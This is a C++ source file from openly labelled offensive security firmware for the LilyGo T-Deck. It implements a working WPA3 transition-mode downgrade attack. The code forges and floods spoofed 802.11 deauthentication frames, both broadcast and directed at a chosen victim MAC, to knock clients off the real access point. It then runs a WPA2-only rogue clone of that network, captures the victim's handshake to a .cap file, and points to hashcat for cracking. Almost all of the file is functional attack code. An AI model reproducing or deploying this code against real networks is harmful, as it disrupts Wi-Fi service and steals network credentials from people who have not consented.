// AL-ANQA — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// wpa3down / w3d — WPA3 transition-mode downgrade attack + handshake capture.
//
// WPA3 "transition mode" (SAE + PSK mixed) accepts BOTH WPA3 and WPA2 clients on
// the same SSID for backward compatibility. That fallback is the weakness: deauth
// a WPA3-capable victim off the real AP, stand up a WPA2-PSK-ONLY rogue AP with the
// same SSID/channel, and the victim reconnects over WPA2 — handing us a crackable
// 4-way handshake WPA3-only mode would never expose.
//
// This is almost entirely ORCHESTRATION of existing Al-Anqa parts (coding rule 5b):
//   - target list  = the last `sw` scan, filtered to WPA3/TD APs
//                    (WiFiFunctions::getNetworkSec == WSEC_TD; the Phase-1 detection)
//   - rogue AP + capture = karma's `roguehs` engine — its beacon is already
//                    WPA2-PSK-only (AKM 0x000FAC02, no SAE), it injects its own M1
//                    (known ANonce) and sniffs the victim's M2 → crackable half
//                    handshake, and keeps beacon+M1+M2 raw frames for a .cap.
//   - .cap writer  = shared `pcap::writeRecord` (linktype 105).
//   - deauth       = the same 26-byte broadcast deauth karma's auto mode injects.
//
// Sources / credit (see NOTICES): Dragonblood (CVE-2019-9494..9499, Vanhoef & Ronen),
// TrustedSec Jul-2024 WPA3-downgrade writeup, RedLegg Jun-2025 eaphammer demo.
//
// SCOPE (Phase 2): the core downgrade — deauth + WPA2 rogue AP + capture. Works on
// transition-mode APs with PMF off/optional. PMF-REQUIRED targets block the deauth
// (the victim won't drop); the empirical PMF probe + pre-association flood fallback
// are Phase 3, not built. Output is a .cap crackable with `cc` (or hashcat/aircrack).
//
// Second silent-failure cause = WPA3 "Transition Disable" (Wi-Fi Alliance, mandatory
// in WPA3-certified clients since Dec 2020): the real AP can signal a protected KDE in
// its 4-way handshake telling the client to store "WPA3-only" in its saved network
// profile → the client then refuses our WPA2 rogue for that SSID, no matter how good
// the deauth. It's CLIENT-side state we can't see or detect. In practice enforcement
// is inconsistent (iPhone/Android/Win11 have all been observed still downgrading), so
// it's a POSSIBLE, not certain, blocker — worth suspecting when a modern client that
// clearly reconnects to the real AP never falls to the rogue.

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include "wpa3down.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "sdcard_manager.h"
#include "wifi_functions.h"
#include "rogue_handshake.h"
#include "pcap_writer.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern WiFiFunctions  wifiFunctions;
extern SDCardManager  sdCardManager;

#define W3D_MAX_TD 32

// ── helpers ─────────────────────────────────────────────────────────────────────

// Broadcast deauth spoofing the REAL AP as source, so its clients drop + re-scan
// and fall to our WPA2 clone. Same frame karma's auto-deauth injects.
static void w3dDeauth(const uint8_t* apBssid) {
    uint8_t f[26] = {0};
    f[0] = 0xC0;                    // mgmt, subtype 12 = deauth
    memset(f + 4, 0xFF, 6);        // DA = broadcast
    memcpy(f + 10, apBssid, 6);    // SA    = real AP
    memcpy(f + 16, apBssid, 6);    // BSSID = real AP
    f[24] = 0x07;                   // reason 7 (class-3 frame from nonassociated STA)
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

// Directed deauth PAIR against one victim STA — far more effective than broadcast
// (many clients, incl. Linux iwlwifi, ignore broadcast deauths). Sends AP->STA and
// STA->AP so both sides tear the association down. Only lands if PMF is not active.
static void w3dDeauthDir(const uint8_t* apBssid, const uint8_t* sta) {
    uint8_t f[26] = {0};
    f[0] = 0xC0; f[24] = 0x07;
    // AP -> STA
    memcpy(f + 4, sta, 6); memcpy(f + 10, apBssid, 6); memcpy(f + 16, apBssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    // STA -> AP (spoof the victim leaving)
    memcpy(f + 4, apBssid, 6); memcpy(f + 10, sta, 6); memcpy(f + 16, apBssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

// Parse an "AA:BB:CC:DD:EE:FF" substring anywhere in s → out[6]. Returns true if found.
static bool w3dParseMac(const char* s, uint8_t* out) {
    for (const char* p = s; p && *p; p++) {
        unsigned v[6];
        if (sscanf(p, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
            for (int k = 0; k < 6; k++) out[k] = (uint8_t)v[k];
            return true;
        }
    }
    return false;
}

// SSID → filesystem-safe base (alnum/._-, else '_'); empty → "net".
static void w3dSanitize(const char* in, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < n - 1; i++) {
        char c = in[i];
        out[j++] = (isalnum((int)c) || c == '.' || c == '_' || c == '-') ? c : '_';
    }
    if (j == 0 && n > 3) { out[j++] = 'n'; out[j++] = 'e'; out[j++] = 't'; }
    out[j] = '\0';
}

// Save beacon + M1 + M2 to /apps/wpa3down/<ssid>.cap (never overwrite). Returns the
// basename in outName. GDMA: call only AFTER roguehs::end() (WiFi idle STA).
static bool w3dSaveCap(const char* ssid, const roguehs::State& s, char* outName, size_t n) {
    if (outName && n) outName[0] = '\0';
    if (!sdCardManager.canAccessSD() || !s.gotM2 || !s.m2RawLen) return false;
    sdCardManager.ensureDir(SD_DIR_WPA3DOWN);
    char safe[40]; w3dSanitize(ssid, safe, sizeof(safe));
    char base[48], fname[96];
    snprintf(base, sizeof(base), "%s.cap", safe);
    snprintf(fname, sizeof(fname), SD_DIR_WPA3DOWN "/%s", base);
    for (int i = 1; SD.exists(fname) && i < 1000; i++) {
        snprintf(base, sizeof(base), "%s-%d.cap", safe, i);
        snprintf(fname, sizeof(fname), SD_DIR_WPA3DOWN "/%s", base);
    }
    File cap = SD.open(fname, FILE_WRITE);
    if (!cap) return false;
    pcap::writeGlobalHeader(cap);
    uint32_t t = s.capTs ? s.capTs : millis();
    if (s.beaconLen) pcap::writeRecord(cap, s.beacon, s.beaconLen, t > 20 ? t - 20 : 0);
    if (s.m1RawLen)  pcap::writeRecord(cap, s.m1Raw,  s.m1RawLen,  t > 10 ? t - 10 : 0);
    pcap::writeRecord(cap, s.m2Raw, s.m2RawLen, t);
    cap.flush(); cap.close();
    if (outName && n) { strncpy(outName, base, n - 1); outName[n - 1] = '\0'; }
    return true;
}

static void w3dBssidStr(const uint8_t* b, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
}

// ── target picker (TD-filtered last-scan list) ───────────────────────────────────

static int w3dPickTarget(const int* tdIdx, int tdCount) {
    int  sel = 0;
    bool redraw = true;
    while (true) {
        if (redraw) {
            displayManager.clearScreen();
            displayManager.setCursor(10, outputY);
            displayManager.setDefaultTextSize();
            displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
            displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
            displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
            displayManager.setTextColor(TFT_YELLOW); displayManager.printText("TARGET");
            displayManager.setTextColor(0x7BEF);     displayManager.println("]");
            displayManager.setCursor(10, outputY + LINE_HEIGHT);
            displayManager.setTextColor(0x7BEF);
            displayManager.println("Transition-mode (WPA3/TD) APs:");
            displayManager.setCursor(0, outputY + 2 * LINE_HEIGHT + 2);
            displayManager.printSeparator();

            int listTop = outputY + 3 * LINE_HEIGHT;
            for (int k = 0; k < tdCount; k++) {
                int i = tdIdx[k];
                char ssid[33]; wifiFunctions.getNetworkSSID(i, ssid);
                uint8_t b[6]; int ch = 0; wifiFunctions.getNetworkInfo(i, b, &ch);
                int  y      = listTop + k * LINE_HEIGHT;
                bool selrow = (k == sel);
                if (selrow) displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
                displayManager.setCursor(2, y);
                displayManager.setTextColor(selrow ? TFT_YELLOW : 0x7BEF);
                displayManager.printText(selrow ? ">" : " ");
                char idx[5]; snprintf(idx, sizeof(idx), "%2d ", i);
                displayManager.setTextColor(TFT_YELLOW); displayManager.printText(idx);
                char name[15]; snprintf(name, sizeof(name), "%-14.14s", ssid[0] ? ssid : "<hidden>");
                displayManager.setTextColor(ssid[0] ? TFT_WHITE : 0x7BEF);
                displayManager.printText(name);
                char meta[16]; snprintf(meta, sizeof(meta), " ch%-2d", ch);
                displayManager.setTextColor(0x7BEF);    displayManager.printText(meta);
                displayManager.setTextColor(TFT_YELLOW); displayManager.printText(" WPA3/TD");
            }

            displayManager.setCursor(0, 210);
            displayManager.printSeparator();
            displayManager.setCursor(6, 214);
            displayManager.setTextColor(0x7BEF);
            displayManager.printText("trkbl=sel  click/ent=pick  [q]cancel");
            displayManager.setTextColor(TFT_WHITE);
            redraw = false;
        }

        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (tb == TBALL_UP)    { if (sel > 0)            { sel--; redraw = true; } continue; }
        if (tb == TBALL_DOWN)  { if (sel < tdCount - 1)  { sel++; redraw = true; } continue; }
        if (tb == TBALL_CLICK) { return tdIdx[sel]; }

        char k = inputHandler.getKeyboardInput();
        if (!k) { if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true; continue; }
        if (k == 'q' || k == 'Q') return -1;
        if (k == '\r' || k == '\n') return tdIdx[sel];
    }
}

// ── attack screen drawing ─────────────────────────────────────────────────────────

static void w3dDrawChrome(const char* ssid, const uint8_t* bssid, int ch, bool pmfWarn,
                          const uint8_t* victim) {
    char bs[18]; w3dBssidStr(bssid, bs);
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();

    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("DOWNGRADE");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");

    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("Target: ");
    displayManager.setTextColor(TFT_WHITE); displayManager.println(ssid[0] ? ssid : "<hidden>");
    displayManager.setCursor(10, outputY + 2 * LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF); displayManager.printText(bs);
    char chs[10]; snprintf(chs, sizeof(chs), "  ch%d", ch);
    displayManager.printText(chs);
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("  WPA3/TD");

    displayManager.setCursor(10, outputY + 3 * LINE_HEIGHT);
    displayManager.setTextColor(TFT_GREEN); displayManager.printText("Rogue AP: ");
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(ssid[0] ? ssid : "<hidden>");
    displayManager.setTextColor(TFT_RED);   displayManager.printText(" [WPA2-ONLY]");

    displayManager.setCursor(0, outputY + 4 * LINE_HEIGHT + 2);
    displayManager.printSeparator();
    displayManager.setCursor(6, outputY + 5 * LINE_HEIGHT);
    if (victim) {
        char vs[26];
        snprintf(vs, sizeof(vs), "Deauth STA %02X:%02X:%02X:%02X:%02X:%02X",
                 victim[0], victim[1], victim[2], victim[3], victim[4], victim[5]);
        displayManager.setTextColor(TFT_GREEN); displayManager.println(vs);
    } else {
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Deauth: broadcast (add victim MAC)");
    }

    if (pmfWarn) {
        displayManager.setCursor(6, outputY + 8 * LINE_HEIGHT);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("PMF/transition-disable may block drop");
    }

    displayManager.setCursor(0, 210);
    displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF);
    displayManager.printText("[q] stop");
    displayManager.setTextColor(TFT_WHITE);
}

static void w3dDrawStats(const roguehs::State& s, uint32_t deauths, uint32_t elapsedMs) {
    int y = outputY + 6 * LINE_HEIGHT;
    displayManager.fillRect(0, y - 1, SCREEN_WIDTH, 2 * LINE_HEIGHT, TFT_BLACK);

    displayManager.setCursor(6, y);
    char l1[40];
    snprintf(l1, sizeof(l1), "Prb %lu  Ath %lu  Asc %lu",
             (unsigned long)s.probes, (unsigned long)s.auths, (unsigned long)s.assocs);
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(l1);
    displayManager.setTextColor(s.gotM2 ? TFT_GREEN : 0x7BEF);
    displayManager.printText(s.gotM2 ? "  M2 OK" : "  M2 --");

    displayManager.setCursor(6, y + LINE_HEIGHT);
    char l2[40];
    snprintf(l2, sizeof(l2), "deauths %lu   %lus",
             (unsigned long)deauths, (unsigned long)(elapsedMs / 1000));
    displayManager.setTextColor(0x7BEF); displayManager.printText(l2);
    displayManager.setTextColor(TFT_WHITE);
}

// ── entry ─────────────────────────────────────────────────────────────────────────

void runWpa3Down(char* args) {
    if (!wifiFunctions.isScanDone()) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Run sw (scan) first.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }

    // Build the WPA3/TD candidate list from the last scan.
    int tdIdx[W3D_MAX_TD]; int tdCount = 0;
    int total = wifiFunctions.getNetworkCount();
    for (int i = 0; i < total && tdCount < W3D_MAX_TD; i++)
        if (wifiFunctions.getNetworkSec(i) == WSEC_TD) tdIdx[tdCount++] = i;

    // Optional victim MAC (`w3d [idx] <aa:bb:cc:dd:ee:ff>`) → directed deauth.
    uint8_t victim[6]; bool hasVictim = (args && *args) && w3dParseMac(args, victim);

    // Resolve the target: explicit `w3d <index>` (any sec), else the TD picker.
    // Only treat a leading numeric token as the index — a MAC arg must not be read as one.
    int target = -1;
    if (args && *args) {
        const char* s = args; while (*s == ' ') s++;
        bool tokIsMac = false;
        for (const char* t = s; *t && *t != ' '; t++) if (*t == ':') { tokIsMac = true; break; }
        if (!tokIsMac && isdigit((unsigned char)*s)) {
            int i = atoi(s);
            if (i >= 0 && i < total) target = i;
        }
    }
    if (target < 0) {
        if (tdCount == 0) {
            displayManager.clearScreen();
            displayManager.setCursor(10, outputY);
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println("No WPA3/TD APs in last scan.");
            displayManager.setTextColor(0x7BEF);
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Only transition-mode is downgradeable.");
            displayManager.setTextColor(TFT_WHITE);
            displayManager.printCommandScreen();
            return;
        }
        target = w3dPickTarget(tdIdx, tdCount);
        if (target < 0) { displayManager.printCommandScreen(); return; }   // cancelled
    }

    uint8_t bssid[6]; int ch = 0; char ssid[33];
    if (!wifiFunctions.getNetworkInfo(target, bssid, &ch) ||
        !wifiFunctions.getNetworkSSID(target, ssid)) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Invalid target index.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }
    if (ssid[0] == '\0') {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Hidden SSID — resolve it first (hiddenssid).");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }
    bool pmfWarn = (wifiFunctions.getNetworkSec(target) != WSEC_OPEN);  // TD/others may have PMF

    // ── stand up the WPA2-only rogue AP (roguehs) on the target's channel ──────────
    if (!roguehs::begin(ssid, (uint8_t)ch)) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Rogue AP start failed.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }

    w3dDrawChrome(ssid, bssid, ch, pmfWarn, hasVictim ? victim : nullptr);

    uint32_t t0 = millis(), lastDeauth = 0, lastDraw = 0, deauths = 0;
    bool captured = false;
    while (true) {
        roguehs::poll();                                   // service rogue AP + sniff M2

        // Continuous deauth FLOOD (~50/s) — make the real AP unusable so the victim
        // is forced onto our rogue even when the real AP has the stronger signal.
        if (millis() - lastDeauth >= 20) {
            w3dDeauth(bssid);                              // broadcast
            if (hasVictim) w3dDeauthDir(bssid, victim);    // directed pair (effective when PMF off)
            deauths++; lastDeauth = millis();
        }

        if (roguehs::state().gotM2) { captured = true; break; }

        if (LockScreenManager::getInstance().consumeJustUnlocked())
            w3dDrawChrome(ssid, bssid, ch, pmfWarn, hasVictim ? victim : nullptr);
        if (!displayManager.isBlocked() && millis() - lastDraw > 250) {
            w3dDrawStats(roguehs::state(), deauths, millis() - t0);
            lastDraw = millis();
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
    }

    // ── teardown BEFORE any SD write (roguehs::end → idle STA, GDMA-safe) ──────────
    roguehs::end();
    const roguehs::State& snap = roguehs::state();   // captured material persists after end()

    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setDefaultTextSize();
    if (captured) {
        char capName[64];
        bool saved = w3dSaveCap(ssid, snap, capName, sizeof(capName));
        char sm[18]; w3dBssidStr(snap.staMac, sm);

        displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
        displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
        displayManager.setTextColor(TFT_GREEN);  displayManager.printText("CAPTURED");
        displayManager.setTextColor(0x7BEF);     displayManager.println("]");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_GREEN);
        displayManager.println("Downgrade handshake captured!");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.printText("Victim: ");
        displayManager.setTextColor(0x7BEF);     displayManager.println(sm);
        displayManager.setCursor(10, displayManager.getCursorY());
        if (saved) {
            displayManager.setTextColor(TFT_GREEN); displayManager.println("Saved:");
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.setTextColor(TFT_WHITE);
            char path[96]; snprintf(path, sizeof(path), SD_DIR_WPA3DOWN "/%s", capName);
            displayManager.println(path);
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.setTextColor(0x7BEF);
            displayManager.println("Crack: cc (or hashcat -m 22000)");
        } else {
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println("No SD — handshake NOT saved.");
        }
    } else {
        displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
        displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
        displayManager.setTextColor(TFT_YELLOW); displayManager.printText("STOPPED");
        displayManager.setTextColor(0x7BEF);     displayManager.println("]");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("No downgrade handshake. Likely:");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println(" - PMF required (deauth blocked)");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println(" - transition-disable on client");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println(" - no WPA2 client / out of range");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_CYAN);
        displayManager.println("Try a non-PMF / older client.");
    }
    displayManager.setTextColor(TFT_WHITE);

    // wait for a keypress so the result is readable
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k) break;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { /* result stays */ }
        delay(20);
    }
    displayManager.printCommandScreen();
}
